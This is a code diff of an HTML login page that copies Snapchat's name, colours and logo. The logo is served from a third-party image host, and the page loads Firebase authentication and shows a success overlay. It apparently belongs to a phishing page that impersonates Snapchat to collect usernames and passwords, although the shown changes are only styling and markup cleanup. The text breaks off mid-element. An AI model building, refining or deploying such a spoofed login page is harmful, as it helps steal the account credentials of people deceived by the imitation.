@@ -9,26 +9,11 @@
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
   <style>
     body { font-family: 'Helvetica Neue', Arial, sans-serif; }
-    .input-field {
-      width: 100%; padding: 14px 16px;
-      border: 2px solid #e5e7eb; border-radius: 14px;
-      font-size: 15px; background: #f9fafb;
-      outline: none; transition: all 0.2s; color: #111;
-    }
-    .input-field:focus {
-      border-color: #E6E300; background: #fffff5;
-      box-shadow: 0 0 0 4px rgba(255,252,0,0.2);
-    }
+    .input-field { width: 100%; padding: 14px 16px; border: 2px solid #e5e7eb; border-radius: 14px; font-size: 15px; background: #f9fafb; outline: none; transition: all 0.2s; color: #111; }
+    .input-field:focus { border-color: #E6E300; background: #fffff5; box-shadow: 0 0 0 4px rgba(255,252,0,0.2); }
     .input-field.error { border-color: #ff3b30; background: #fff5f5; }
-    .btn-login {
-      width: 100%; padding: 15px;
-      background: #FFFC00; color: #000;
-      font-weight: 800; font-size: 16px;
-      border: none; border-radius: 50px;
-      cursor: pointer; transition: all 0.2s;
-    }
-    .btn-login:hover { background: #E6E300; transform: translateY(-1px); box-shadow: 0 8px 20px rgba(255,252,0,0.5); }
-    .btn-login:active { transform: translateY(0); box-shadow: none; }
+    .btn-login { width: 100%; padding: 15px; background: #FFFC00; color: #000; font-weight: 800; font-size: 16px; border: none; border-radius: 50px; cursor: pointer; transition: all 0.2s; }
+    .btn-login:hover { background: #E6E300; transform: translateY(-1px); }
     .btn-login.loading { pointer-events: none; opacity: 0.8; }
     .btn-login.loading .btn-text { display: none; }
     .btn-login.loading .spinner { display: block; }
@@ -38,19 +23,17 @@
     .success-overlay.show { display: flex; }
   </style>
 </head>
-<body style="background:#FFFC00;" class="min-h-screen flex items-center justify-center">
-
-  <div class="bg-white rounded-3xl w-full max-w-sm mx-4 px-9 pt-10 pb-9 relative"
-       style="box-shadow: 0 24px 80px rgba(0,0,0,0.13);">
+<body style="background:#FFFC00;" class="min-h-screen flex items-center justify-center p-4">
+  <div class="bg-white rounded-3xl w-full max-w-sm px-9 pt-10 pb-9 relative" style="box-shadow: 0 24px 80px rgba(0,0,0,0.13);">
 
     <div class="success-overlay" id="successOverlay">
-      <img src="https://i.ibb.co/VjZzNm3/images-removebg-preview.png" alt="Snapchat" width="80" height="80" style="object-fit:contain;"/>
+      <img src="https://i.ibb.co/VjZzNm3/images-removebg-preview.png" width="80" height="80" style="object-fit:contain;"/>
       <p class="text-xl font-extrabold text-black" id="successMsg"></p>
       <p class="text-sm text-gray-500" id="successName"></p>
     </div>
 
     <div class="flex flex-col items-center mb-8">
-      <img src="https://i.ibb.co/VjZzNm3/images-removebg-preview.png" alt="Snapchat Logo" width="80" height="80" style="object-fit:contain;"/>
+      <img src="https://i.ibb.co/VjZzNm3/images-removebg-preview.png" width="80" height="80" style="object-fit:contain;"/>
       <h1 class="text-2xl font-extrabold tracking-tight text-black mt-2">Snapchat</h1>
     </div>
 
@@ -64,5 +47,6 @@
         <label class="block text-xs font-semibold text-gray-400 uppercase tracking-widest mb-2">Password</label>
         <div class="relative">
           <input id="password" type="password" placeholder="••••••••" class="input-field" style="padding-right:48px;"/>
-          <button type="button" id="togglePw" class="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-700">
-            <svg id="eyeOpen" width​​​​​​​​​​​​​​​​
+          <button type="button" id="togglePw" class="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-400">
+            <svg id="eyeOpen" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+            <svg id="eyeClosed" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-
